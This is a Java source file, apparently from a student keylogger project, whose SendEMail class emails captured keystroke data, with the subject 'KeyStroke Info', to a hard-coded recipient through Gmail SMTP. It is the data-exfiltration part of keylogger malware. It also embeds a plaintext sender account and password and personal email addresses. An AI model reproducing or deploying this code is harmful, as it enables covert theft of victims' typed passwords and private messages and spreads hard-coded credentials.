/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Controllers;

import java.util.Properties;
import javax.mail.Message.RecipientType;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

/**
 *
 * @author ahmed
 */
public class SendEMail {

    private SendEMail() {
    }

    private static final String SENDERS_GMAIL = "keyloggerproject11@gmail.com";
    private static final String SENDERS_PASSWARD = "keylogger2022";

    private static final String RECIEVERS_GMAIL = "ahmednesar136@gmail.com";

    private static Properties mailServerProperties;
    private static Session mailSess;
    private static MimeMessage mailMessage;

    public static void sendMail(String emailBody) throws Throwable {
        mailServerProperties = System.getProperties();
        mailServerProperties.put("mail.smtp.port", "587");
        mailServerProperties.put("mail.smtp.auth", "true");
        mailServerProperties.put("mail.smtp.starttls.enable", "true");

        mailSess = Session.getDefaultInstance(mailServerProperties);
        mailMessage = new MimeMessage(mailSess);
        mailMessage.addRecipient(RecipientType.BCC, new InternetAddress(RECIEVERS_GMAIL));
        mailMessage.setSubject("KeyStroke Info");
        mailMessage.setContent(emailBody, "text/html");

        Transport transport = mailSess.getTransport("smtp");
        transport.connect("smtp.gmail.com", SENDERS_GMAIL, SENDERS_PASSWARD);
        transport.sendMessage(mailMessage, mailMessage.getAllRecipients());
        transport.close();

    }

}
